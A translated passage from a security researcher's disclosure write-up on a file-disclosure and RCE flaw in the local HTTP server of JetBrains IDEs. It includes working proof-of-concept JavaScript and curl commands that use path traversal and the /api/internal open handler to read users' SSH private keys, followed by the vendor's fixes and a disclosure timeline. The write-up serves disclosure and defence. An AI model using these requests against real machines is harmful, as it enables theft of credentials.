        // Chances are that both `.ssh` and the project directory are under the user's home folder,
        // let's try to walk up the dir tree.
        dotSegs = "..%2f".repeat(depth);
        xhr.open("GET", "http://localhost:63342/" + projectName + "/" + dotSegs + ".ssh/id_rsa.pub", true);
        xhr.onload = function() {
          if (xhr.status === 200) {
            console.log(xhr.responseText);
          } else {
            tryNextDepth();
          }
        };
        xhr.send();
      }
    };
    findLoadedProject(function(projectName) {
      if(projectName) {
        console.log(projectName, "is a valid project, looking for SSH key");
        findSSHKeys(projectName);
      } else {
        console.log("Failed to guess a project name");
      }
    });
**可以避开项目名称猜测吗？**
必须要猜测出准确的项目名称这一点大大的缓冲了文件泄露的灾害性，但是API可能会解决这一问题。
最后我发现了JetBrainsProtocolHandlerHttpService对应的/api/internal 端口。显然这个端口可以在JSON
blob中传送一个含有jetbrains: 的URL。
/ /  /open/ 处理程序似乎可以发现一些问题：
    public class JBProtocolOpenProjectCommand extends JBProtocolCommand {
      public JBProtocolOpenProjectCommand() {
        super("open");
      }
      @Override
      public void perform(String target, Map parameters) {
        String path = URLDecoder.decode(target);
        path = StringUtil.trimStart(path, LocalFileSystem.PROTOCOL_PREFIX);
        ProjectUtil.openProject(path, null, true);
      }
    }
这让我们可以通过绝对路径打开一个项目，大多数 * NIX 系统
都有/Etc 目录，我们尝试打开一下：
    $ curl "http://127.0.0.1:63342/api/internal" --data '{"url": "jetbrains://whatever/open//etc"}'
所以该目录需要确实包含一个JetBrains风格的项目，不能简单地忽略任何旧目录。在OSX版本中，这会在/Applications/PyCharm.app/Contents/helpers下面，我们来试一下：
    $ curl -v "http://127.0.0.1:63342/api/internal" --data '{"url": "jetbrains://whatever/open//Applications/PyCharm.app/Contents/helpers"}'
只要我们确保现在项目是打开的状态，就不必再猜测项目名称了。在Linux中PyCharm
的根文件夹没有标准位置，但我们可以发出/api/about?more=true请求来确定：
    {
      "name": "PyCharm 2016.1.2",
      "productName": "PyCharm",
      "baselineVersion": 145,
      "buildNumber": 844,
      "vendor": "JetBrains s.r.o.",
      "isEAP": false,
      "productCode": "PY",
      "buildDate": 1460098800000,
      "isSnapshot": false,
      "configPath": "/home/user/.PyCharm2016.1/config",
      "systemPath": "/home/user/.PyCharm2016.1/system",
      "binPath": "/home/user/opt/pycharm/bin",
      "logPath": "/home/user/.PyCharm2016.1/system/log",
      "homePath": "/home/user/opt/pycharm"
    }
一旦我们打开
helpers项目，就可以从/api/about?more=true响应中确定用户的本地目录，然后用来构建一个访问SSH密钥的URL，就像这样/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome//.ssh/id_rsa：
    $ curl -v "http://localhost:63342/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa"
    > GET /helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa HTTP/1.1
    [...]
    > 
    //：
    $ curl -v "http://127.0.0.1:63342/api/internal" --data '{"url": "jetbrains://whatever/open//net/nfs.example.com/anonshare/testing"}'
在HTML PoC看到了这个：
这可能适用于所有使用-hosts的* NIX 式 autofs 挂载点，但是OS X 是我能找到的在默认安装中这样配置autofs的唯一操作系统。
**  
**
**PoC**
· 最小化文件泄露PoC
· Weaponized 文件泄漏 PoC
· WINDOWS和OSX的RCE中没有PoC
**修复**
· 下面是我知道的JetBrains做出的几点修复措施：
· 发送给本地HTTP服务器的所有请求都需要一个陌生的身份验证包，否则服务器会返回4xx状态代码。
· 疑难CORS策略被完全删除。
· 现在需要验证host标头值，以防止类似漏洞。
**供应商反响——与供应商的交流**
在这里要感谢Hadi Hariri 及其团队对于我报告的主动回应。在我发出电子邮件后的一小时就收到了回复。
他们发送了补丁给我，以及他们解决方案的二进制构建，并且也接受我在反馈中提到的潜在问题。
**披露时间轴**
•2016-04-04：发现本地文件泄露问题
•2016-04-06：向供应商提出安全接触请求
•2016-04-06：供应商回复安全联系信息，请求漏洞详细信息
•2016-04-07：向供应商发送本地文件泄漏漏洞的 PoC
•2016-04-10：向供应商发送关于RCE 的补救步骤和细节的更详细报告
•2016-04-12：供应商做出响应，表示他们正在修补程序
•2016-04-14：供应商在响应中提供了针对开源intellij-community的修补程序
•2016-04-14：发送修补程序修改意见给供应商
•2016-04-15：供应商做出响应，表示他们正在更新修补程序
•2016-04-26：供应商表示，他们打算近期发布补丁
•2016-05-11：发布针对所有JetBrains IDE的安全修补程序